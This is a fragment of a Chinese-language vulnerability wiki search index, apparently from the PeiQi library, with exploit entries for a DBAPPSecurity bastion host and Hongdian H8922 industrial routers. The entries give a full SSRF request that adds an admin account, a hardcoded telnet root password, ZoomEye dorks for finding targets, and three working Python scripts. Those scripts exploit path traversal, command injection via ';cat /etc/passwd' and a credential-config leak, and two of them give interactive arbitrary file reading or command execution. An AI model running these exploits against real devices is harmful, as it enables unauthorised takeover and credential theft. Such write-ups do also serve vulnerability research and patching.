","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:4","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"安恒 明御运维审计与风险控制系统 xmlrpc.sock 任意用户添加漏洞 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-xmlrpc.sock-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-xmlrpc.sock-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 安恒 明御运维审计与风险控制系统 xmlrpc.sock 接口存在SSRF漏洞，通过漏洞可以添加任意用户控制堡垒机 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-xmlrpc.sock-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-xmlrpc.sock-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 安恒 明御运维审计与风险控制系统 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-xmlrpc.sock-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-xmlrpc.sock-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"明御运维审计与风险控制系统\" ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-xmlrpc.sock-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-xmlrpc.sock-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1 Host: Cookie: LANG=zh; DBAPPUSM=ee4bbf6c85e541bb980ad4e0fbee2f57bb15bafe20a7028af9a0b8901cf80fd3 Content-Length: 1117 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"Windows\" Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close \u003c?xml version=\"1.0\"?\u003e \u003cmethodCall\u003e \u003cmethodName\u003eweb.user_add\u003c/methodName\u003e \u003cparams\u003e \u003cparam\u003e \u003cvalue\u003e \u003carray\u003e \u003cdata\u003e \u003cvalue\u003e \u003cstring\u003eadmin\u003c/string\u003e \u003c/value\u003e \u003cvalue\u003e \u003cstring\u003e5\u003c/string\u003e \u003c/value\u003e \u003cvalue\u003e \u003cstring\u003e10.0.0.1\u003c/string\u003e \u003c/value\u003e \u003c/data\u003e \u003c/array\u003e \u003c/value\u003e \u003c/param\u003e \u003cparam\u003e \u003cvalue\u003e \u003cstruct\u003e \u003cmember\u003e \u003cname\u003euname\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003etest\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003ename\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003etest\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003epwd\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e1qaz@3edC12345\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003eauthmode\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e1\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003edeptid\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003eemail\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003emobile\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003ecomment\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003eroleid\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e102\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003c/struct\u003e\u003c/value\u003e \u003c/param\u003e \u003c/params\u003e \u003c/methodCall\u003e ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-xmlrpc.sock-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-xmlrpc.sock-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"宏电 H8922 Telnet后门漏洞 CVE-2021-28149 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-telnet%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-cve-2021-28149/:0:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-telnet%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-cve-2021-28149/"},{"categories":null,"content":"漏洞描述 宏电 H8922 Telnet存在硬编码的账号密码 且默认开放 5188端口连接，可以以Root身份获取权限 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-telnet%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-cve-2021-28149/:1:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-telnet%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-cve-2021-28149/"},{"categories":null,"content":"漏洞影响 宏电 H8922 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-telnet%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-cve-2021-28149/:2:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-telnet%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-cve-2021-28149/"},{"categories":null,"content":"ZoomEye app:\"Hongdian H8922 Industrial Router\" ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-telnet%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-cve-2021-28149/:3:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-telnet%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-cve-2021-28149/"},{"categories":null,"content":"漏洞复现 使用Telnet连接目标5188端口，账号密码为 root/superzxmn ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-telnet%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-cve-2021-28149/:4:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-telnet%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-cve-2021-28149/"},{"categories":null,"content":"宏电 H8922 后台任意文件读取漏洞 CVE-2021-28152 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-28152/:0:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-28152/"},{"categories":null,"content":"漏洞描述 宏电 H8922 后台存在任意文件读取漏洞，低权限用户通过漏洞可以获取任意文件内容 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-28152/:1:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-28152/"},{"categories":null,"content":"漏洞影响 宏电 H8922 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-28152/:2:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-28152/"},{"categories":null,"content":"ZoomEye app:\"Hongdian H8922 Industrial Router\" ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-28152/:3:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-28152/"},{"categories":null,"content":"漏洞复现 登录后台(存在访客用户默认账号密码 guest/guest) 漏洞存在于 log_download.cgi 文件中 使用type参数读取文件并下载日志给用户，使用 ../../ 可以跳转根目录读取任意文件 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-28152/:4:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-28152/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from lxml import etree from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 宏电 H8922 后台任意文件读取漏洞 CVE-2021-28152 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, filename): vuln_url = target_url + \"/log_download.cgi?type=../..{}\".format(filename) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/log_download.cgi?type=../../etc/passwd \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功读取 /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: filename = input(\"\\033[35mFilename \u003e\u003e\u003e \\033[0m\") if filename == \"exit\": sys.exit(0) else: POC_2(target_url, filename) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, filename): vuln_url = target_url + \"/log_download.cgi?type=../..{}\".format(filename) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] {} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() filename = '/etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url, filename) ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-28152/:5:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-28152/"},{"categories":null,"content":"宏电 H8922 后台命令执行漏洞 CVE-2021-28150 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-28150/:0:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-28150/"},{"categories":null,"content":"漏洞描述 宏电 H8922 后台中的网络测试模块中存在命令执行漏洞。通过命令拼接执行任意命令 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-28150/:1:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-28150/"},{"categories":null,"content":"漏洞影响 宏电 H8922 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-28150/:2:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-28150/"},{"categories":null,"content":"ZoomEye app:\"Hongdian H8922 Industrial Router\" ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-28150/:3:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-28150/"},{"categories":null,"content":"漏洞复现 登录后台(存在访客用户默认账号密码 guest/guest) 使用 ; 命令拼接执行任意命令 请求包为 POST /tools.cgi HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 96 Cache-Control: max-age=0 Authorization: Basic Z3Vlc3Q6Z3Vlc3Q= Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close op_type=ping\u0026destination=;cat /etc/passwd\u0026user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-28150/:4:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-28150/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from lxml import etree from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 宏电 H8922 后台命令执行漏洞 CVE-2021-28150 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/tools.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } data = \"op_type=ping\u0026destination=;cat /etc/passwd\u0026user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/tools.cgi \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功执行 cat /etc/passwd \\033[0m\".format(target_url)) html = etree.HTML(response.text) cmd_test = html.xpath('/html/body/div[1]/div/div[2]/div/form/fieldset[2]/div/textarea/text()')[0] print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(cmd_test)) while True: cmd = input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/tools.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } data = \"op_type=ping\u0026destination=;{}\u0026user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) html = etree.HTML(response.text) cmd_test = html.xpath('/html/body/div[1]/div/div[2]/div/form/fieldset[2]/div/textarea/text()')[0] print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(cmd_test)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url, cmd) ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-28150/:5:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-28150/"},{"categories":null,"content":"宏电 H8922 后台管理员信息泄露漏洞 CVE-2021-28151 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-28151/:0:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-28151/"},{"categories":null,"content":"漏洞描述 宏电 H8922 后台存在管理员信息泄露漏洞，攻击者使用任意账号登录后访问特殊的Url即可获取所有用户的账号和密码 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-28151/:1:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-28151/"},{"categories":null,"content":"漏洞影响 宏电 H8922 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-28151/:2:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-28151/"},{"categories":null,"content":"ZoomEye app:\"Hongdian H8922 Industrial Router\" ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-28151/:3:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-28151/"},{"categories":null,"content":"漏洞复现 登录后台(存在访客用户默认账号密码 guest/guest) 漏洞存在于 backup2.cgi 文件中 分析后可得知实际运行后将会读取 /tmp/hdconfig/cli.conf 配置文件 其中配置文件中是含有所有用户密码以及敏感配置信息的 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-28151/:4:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-28151/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 宏电 H8922 后台管理员信息泄露漏洞 CVE-2021-28151 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/backup2.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/backup2.cgi.... \\033[0m\".format(target_url)) if 'service webadmin' in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功读取配置文件 \\033[0m\".format(target_url)) print(\"\\033[36m[o] 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) 